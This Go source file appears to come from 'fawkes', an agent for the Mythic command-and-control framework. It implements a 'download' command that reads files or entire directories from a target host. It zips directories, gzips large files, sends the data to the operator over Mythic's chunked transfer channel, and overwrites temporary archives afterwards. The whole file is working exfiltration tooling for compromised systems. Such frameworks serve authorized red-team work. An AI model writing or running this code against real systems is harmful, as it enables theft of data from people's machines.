package commands

import (
	"archive/zip"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/files"
	"fawkes/pkg/structs"
)

// DownloadCommand implements the download command
type DownloadCommand struct{}

// Name returns the command name
func (c *DownloadCommand) Name() string {
	return "download"
}

// Description returns the command description
func (c *DownloadCommand) Description() string {
	return "Download a file or directory from the target system"
}

// downloadArgs represents JSON-structured download arguments
type downloadArgs struct {
	Path     string `json:"path"`
	File     string `json:"file"`     // Alias for path (file browser compat)
	Compress *bool  `json:"compress"` // nil = auto (compress if > 1MB)
}

// autoCompressThreshold is the file size above which compression is auto-enabled
const autoCompressThreshold = 1024 * 1024 // 1 MB

// Execute executes the download command with full chunked file transfer
func (c *DownloadCommand) Execute(task structs.Task) structs.CommandResult {
	path, compress := parseDownloadArgs(task.Params)

	if path == "" {
		return errorResult("No file path specified. Usage: download <file_path>")
	}

	// Get absolute path
	fullPath, err := filepath.Abs(path)
	if err != nil {
		return errorf("resolving file path: %s", err.Error())
	}

	// Check if path exists and whether it's a directory
	info, err := os.Stat(fullPath)
	if err != nil {
		return errorf("accessing path: %s", err.Error())
	}

	if info.IsDir() {
		// Directories are already zip-compressed; no additional gzip
		return downloadDirectory(task, fullPath)
	}

	// Auto-determine compression if not explicitly set
	if compress == nil {
		shouldCompress := info.Size() > autoCompressThreshold
		compress = &shouldCompress
	}

	if *compress {
		return downloadFileCompressed(task, fullPath, info.Size())
	}
	return downloadFile(task, fullPath)
}

// parseDownloadArgs parses download parameters from either JSON or plain string
func parseDownloadArgs(params string) (path string, compress *bool) {
	params = strings.TrimSpace(params)

	// Try JSON first
	var args downloadArgs
	if err := json.Unmarshal([]byte(params), &args); err == nil {
		path = args.Path
		if path == "" {
			path = args.File
		}
		return stripPathQuotes(path), args.Compress
	}

	// Fall back to plain string path
	return stripPathQuotes(params), nil
}

// downloadFile handles single file downloads via Mythic's chunked transfer (uncompressed)
func downloadFile(task structs.Task, fullPath string) structs.CommandResult {
	file, err := os.Open(fullPath)
	if err != nil {
		return errorf("opening file: %s", err.Error())
	}
	defer file.Close()

	fi, err := file.Stat()
	if err != nil {
		return errorf("getting file info: %s", err.Error())
	}

	result, tfResult := sendFileToMythicWithResult(task, file, fi.Name(), fullPath)
	if result.Status == "success" && tfResult != nil {
		result.Output = fmt.Sprintf("Downloaded %s (%s)\nSHA256: %s",
			fullPath, formatFileSize(fi.Size()), tfResult.SHA256)
	}
	return result
}

// downloadFileCompressed gzip-compresses a file before transfer to reduce bandwidth
func downloadFileCompressed(task structs.Task, fullPath string, originalSize int64) structs.CommandResult {
	// Compress the file to a temp gzip file
	compResult, err := files.CompressFileGzip(fullPath)
	if err != nil {
		result := downloadFile(task, fullPath)
		if result.Status == "success" {
			result.Output += "\nNote: compression failed, sent uncompressed"
		}
		return result
	}
	defer secureRemove(compResult.CompressedPath)

	// If compression didn't help (e.g., already compressed file), send uncompressed
	if compResult.CompressedSize >= originalSize {
		return downloadFile(task, fullPath)
	}

	// Open the compressed file for transfer
	gzFile, err := os.Open(compResult.CompressedPath)
	if err != nil {
		return downloadFile(task, fullPath)
	}
	defer gzFile.Close()

	// Transfer with .gz extension so operator knows it's compressed
	downloadName := filepath.Base(fullPath) + ".gz"
	ratio := files.CompressionRatio(compResult.OriginalSize, compResult.CompressedSize)

	result, _ := sendFileToMythicWithResult(task, gzFile, downloadName, fullPath)
	if result.Status == "success" {
		result.Output = fmt.Sprintf("Downloaded %s (compressed)\nOriginal: %s → Compressed: %s (%.1f%% reduction)\nOriginal SHA256: %s",
			fullPath,
			formatFileSize(compResult.OriginalSize),
			formatFileSize(compResult.CompressedSize),
			ratio,
			compResult.SHA256)
	}
	return result
}

// downloadDirectory zips a directory into a temp file, downloads it, then cleans up
func downloadDirectory(task structs.Task, dirPath string) structs.CommandResult {
	// Create temp zip file
	tmpFile, err := os.CreateTemp("", "")
	if err != nil {
		return errorf("cannot create temp file (disk full or temp directory not writable)")
	}
	tmpPath := tmpFile.Name()

	// Ensure cleanup of temp file — overwrite before removal
	defer secureRemove(tmpPath)

	// Create zip archive of directory
	fileCount, totalSize, skipped, zipErr := zipDirectory(tmpFile, dirPath)
	tmpFile.Close()
	if zipErr != nil {
		return errorf("creating zip archive: %v", zipErr)
	}

	if fileCount == 0 {
		return errorf("directory %s contains no accessible files", dirPath)
	}

	// Open the temp zip for transfer
	zipFile, err := os.Open(tmpPath)
	if err != nil {
		return errorf("cannot open temp zip file for transfer (file may have been cleaned up)")
	}
	defer zipFile.Close()

	zipInfo, _ := zipFile.Stat()
	zipSize := int64(0)
	if zipInfo != nil {
		zipSize = zipInfo.Size()
	}

	// Use the directory's base name + .zip as the download filename
	downloadName := filepath.Base(dirPath) + ".zip"

	result := sendFileToMythic(task, zipFile, downloadName, dirPath)
	if result.Status == "success" {
		msg := fmt.Sprintf("Downloaded directory as zip: %s (%d files, %s original, %s compressed)",
			dirPath, fileCount, formatFileSize(totalSize), formatFileSize(zipSize))
		if len(skipped) > 0 {
			msg += fmt.Sprintf("\n%d files skipped:", len(skipped))
			limit := len(skipped)
			if limit > 10 {
				limit = 10
			}
			for _, s := range skipped[:limit] {
				msg += "\n  " + s
			}
			if len(skipped) > 10 {
				msg += fmt.Sprintf("\n  ... and %d more", len(skipped)-10)
			}
		}
		result.Output = msg
	}
	return result
}

// zipDirectory creates a zip archive of a directory, writing to the provided file.
// Returns file count, total uncompressed size, skipped file descriptions, and any error.
func zipDirectory(w *os.File, dirPath string) (int, int64, []string, error) {
	zw := zip.NewWriter(w)

	var fileCount int
	var totalSize int64
	var skipped []string
	const maxDepth = 10

	err := filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, walkErr error) error {
		if walkErr != nil {
			relPath, _ := filepath.Rel(dirPath, path)
			skipped = append(skipped, fmt.Sprintf("%s (access denied)", relPath))
			return nil
		}

		relPath, _ := filepath.Rel(dirPath, path)
		if relPath == "." {
			return nil
		}

		// Check depth
		depth := len(strings.Split(relPath, string(os.PathSeparator)))
		if depth > maxDepth {
			if d.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}

		// Skip directories (created implicitly by file paths)
		if d.IsDir() {
			return nil
		}

		// Skip symlinks
		if d.Type()&os.ModeSymlink != 0 {
			return nil
		}

		info, infoErr := d.Info()
		if infoErr != nil {
			skipped = append(skipped, fmt.Sprintf("%s (stat failed: %v)", relPath, infoErr))
			return nil
		}

		header, headerErr := zip.FileInfoHeader(info)
		if headerErr != nil {
			skipped = append(skipped, fmt.Sprintf("%s (header error: %v)", relPath, headerErr))
			return nil
		}
		header.Name = filepath.ToSlash(relPath)
		header.Method = zip.Deflate

		writer, createErr := zw.CreateHeader(header)
		if createErr != nil {
			skipped = append(skipped, fmt.Sprintf("%s (zip header: %v)", relPath, createErr))
			return nil
		}

		file, openErr := os.Open(path)
		if openErr != nil {
			skipped = append(skipped, fmt.Sprintf("%s (open failed: %v)", relPath, openErr))
			return nil
		}
		defer file.Close()

		written, copyErr := io.Copy(writer, file)
		if copyErr != nil {
			skipped = append(skipped, fmt.Sprintf("%s (read error: %v)", relPath, copyErr))
			return nil
		}

		fileCount++
		totalSize += written
		return nil
	})

	if err != nil {
		zw.Close()
		return fileCount, totalSize, skipped, err
	}

	if err := zw.Close(); err != nil {
		return fileCount, totalSize, skipped, fmt.Errorf("finalizing zip: %w", err)
	}

	return fileCount, totalSize, skipped, nil
}

// sendFileToMythic sends a file to Mythic via the chunked transfer channel (backward-compat wrapper)
func sendFileToMythic(task structs.Task, file *os.File, fileName, fullPath string) structs.CommandResult {
	result, _ := sendFileToMythicWithResult(task, file, fileName, fullPath)
	return result
}

// sendFileToMythicWithResult sends a file to Mythic and returns both the command result and transfer metadata
func sendFileToMythicWithResult(task structs.Task, file *os.File, fileName, fullPath string) (structs.CommandResult, *structs.FileTransferResult) {
	tfResult := &structs.FileTransferResult{}
	downloadMsg := structs.SendFileToMythicStruct{}
	downloadMsg.Task = &task
	downloadMsg.IsScreenshot = false
	downloadMsg.SendUserStatusUpdates = true
	downloadMsg.File = file
	downloadMsg.FileName = fileName
	downloadMsg.FullPath = fullPath
	downloadMsg.FinishedTransfer = make(chan int, 2)
	downloadMsg.TransferResult = tfResult

	task.Job.SendFileToMythic <- downloadMsg

	for {
		select {
		case <-downloadMsg.FinishedTransfer:
			return successResult("Finished Downloading"), tfResult
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return errorResult("Tasked to stop early"), nil
			}
		}
	}
}
